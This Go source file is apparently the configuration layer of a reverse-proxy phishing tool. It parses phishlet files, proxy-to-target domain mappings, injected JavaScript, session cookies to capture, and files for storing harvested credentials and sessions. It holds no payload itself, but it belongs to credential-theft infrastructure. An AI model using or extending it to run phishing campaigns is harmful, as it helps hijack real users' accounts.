package main

import (
	"fmt"
	"io/fs"
	"path"
	"strings"
	"time"

	"github.com/go-playground/validator/v10"
	"github.com/knadh/koanf"
	"github.com/knadh/koanf/maps"
	"github.com/knadh/koanf/parsers/dotenv"
	"github.com/knadh/koanf/parsers/yaml"
	"github.com/knadh/koanf/providers/confmap"
	"github.com/knadh/koanf/providers/env"
	kfs "github.com/knadh/koanf/providers/fs"
	"github.com/rs/zerolog"
)

const RegexpSuffix = ",regexp"

var validate = validator.New()

type appConfig struct {
	APIToken             string          `koanf:"api_token" validate:"required"`
	APISubdomain         string          `koanf:"api_subdomain"`
	ListenAddr           string          `koanf:"listen_addr" validate:"required"`
	DomainName           string          `koanf:"domain_name" validate:"required"`
	ExternalPort         string          `koanf:"external_port" validate:"omitempty,numeric"`
	TLSKey               string          `koanf:"tls_key" validate:"required_with=TLSCert"`
	TLSCert              string          `koanf:"tls_cert" validate:"required_with=TLSKey"`
	SessionCookieName    string          `koanf:"session.cookie_name" validate:"required"`
	SessionExpiration    time.Duration   `koanf:"session.expiration" validate:"required"`
	StaticDomainMappings []DomainMapping `koanf:"domain_mappings"`
	PhishletFile         string          `koanf:"phishlet_file" validate:"required"`
	DBType               string          `koanf:"db_type" validate:"required,oneof=file"`
	CredsFile            string          `koanf:"creds_file"`
	SessionsFile         string          `koanf:"sessions_file"`
	LuresFile            string          `koanf:"lures_file"`
	LimitMax             int             `koanf:"limit_max"`
	LimitExpiration      time.Duration   `koanf:"limit_expiration"`
	NoAuth               bool            `koanf:"no_auth"`
	DomainNameWithPort   string
	Phishlet             *phishletConfig
	APIHostname          string
}

type phishletConfig struct {
	InvalidAuthURL string   `koanf:"invalid_auth_url" validate:"required,url"`
	LoginURL       string   `koanf:"login_url" validate:"required,url"`
	JsFiles        []string `koanf:"js_files"`
	JsFilesBody    []string
	SessionCookies []*SessionCookieConfig `koanf:"session_cookies"`
}

// TODO validate name and domain not empty
type SessionCookieConfig struct {
	Name     string `koanf:"name"`
	Domain   string `koanf:"domain"`
	Required bool   `koanf:"required"`
	Regexp   bool
}

type DomainMapping struct {
	Proxy  string `koanf:"proxy"`
	Target string `koanf:"target"`
}

type configSource struct {
	provider koanf.Provider
	parser   koanf.Parser
}

func parseAppConfig(fsys fs.FS, yamlFile, envFile string) (*appConfig, error) {
	var configs []*configSource
	if yamlFile != "" {
		configs = append(configs, &configSource{
			provider: kfs.Provider(fsys, yamlFile),
			parser:   yaml.Parser(),
		})
	}
	configs = append(configs, &configSource{
		provider: env.Provider("", ".", strings.ToLower),
	})
	if envFile != "" {
		configs = append(configs, &configSource{
			provider: kfs.Provider(fsys, envFile),
			parser:   &lowerCaseParser{dotenv.Parser()},
		})
	}
	return newAppConfig(configs...)
}

func newAppConfig(configs ...*configSource) (*appConfig, error) {
	k := koanf.New(".")
	err := k.Load(confmap.Provider(map[string]interface{}{
		"api_subdomain":       "api",
		"listen_addr":         "0.0.0.0:8080",
		"session.cookie_name": "session_id",
		"session.expiration":  30 * time.Minute,
		"db_type":             "file",
		"creds_file":          "creds.jsonl",
		"sessions_file":       "sessions.jsonl",
		"lures_file":          "lures.yaml",
		"limit_max":           400,
		"limit_expiration":    10 * time.Second,
	}, "."), nil)
	if err != nil {
		return nil, err
	}
	for _, config := range configs {
		if err = k.Load(config.provider, config.parser); err != nil {
			return nil, err
		}
	}
	var conf appConfig
	if err = k.UnmarshalWithConf("", &conf, koanf.UnmarshalConf{FlatPaths: true}); err != nil {
		return nil, err
	}
	err = validate.Struct(&conf)
	if conf.ExternalPort == "" || conf.ExternalPort == "443" {
		conf.DomainNameWithPort = conf.DomainName
	} else {
		conf.DomainNameWithPort = fmt.Sprintf("%s:%s", conf.DomainName, conf.ExternalPort)
	}
	conf.APIHostname = fmt.Sprintf("%s.%s", conf.APISubdomain, conf.DomainNameWithPort)
	return &conf, err
}

type lowerCaseParser struct {
	koanf.Parser
}

func (p *lowerCaseParser) Unmarshal(b []byte) (m map[string]interface{}, err error) {
	if m, err = p.Parser.Unmarshal(b); err != nil {
		return
	}
	mp := make(map[string]interface{})
	for k, v := range m {
		mp[strings.ToLower(strings.Trim(k, " \t"))] = v
	}
	return maps.Unflatten(mp, "."), nil
}

func parsePhishletConfig(fsys fs.FS, yamlFile string) (*phishletConfig, error) {
	k := koanf.New(".")
	if err := k.Load(kfs.Provider(fsys, yamlFile), yaml.Parser()); err != nil {
		return nil, err
	}
	var conf phishletConfig
	if err := k.UnmarshalWithConf("", &conf, koanf.UnmarshalConf{FlatPaths: true}); err != nil {
		return nil, err
	}
	err := validate.Struct(&conf)
	for _, jsFile := range conf.JsFiles {
		jsPath := path.Join(path.Dir(yamlFile), jsFile)
		data, err := fs.ReadFile(fsys, jsPath)
		if err != nil {
			return nil, err
		}
		conf.JsFilesBody = append(conf.JsFilesBody, string(data))
	}
	for _, cookie := range conf.SessionCookies {
		if strings.HasSuffix(cookie.Name, RegexpSuffix) {
			cookie.Regexp = true
			cookie.Name = strings.TrimSuffix(cookie.Name, RegexpSuffix)
		}
	}
	return &conf, err
}

func setupAppConfig(fsys fs.FS, yamlFile, envFile string) (conf *appConfig, err error) {
	if conf, err = parseAppConfig(fsys, yamlFile, envFile); err != nil {
		return
	}
	conf.Phishlet, err = parsePhishletConfig(fsys, conf.PhishletFile)
	return
}

func setLogLevel(log *zerolog.Logger, verboseLevel int) *zerolog.Logger {
	level := zerolog.InfoLevel
	switch {
	case verboseLevel == 0:
	case verboseLevel <= -2:
		level = zerolog.Disabled
	case verboseLevel == -1:
		level = zerolog.ErrorLevel
	case verboseLevel == 1:
		level = zerolog.DebugLevel
	case verboseLevel >= 2:
		level = zerolog.TraceLevel
	}
	result := log.Level(level)
	return &result
}
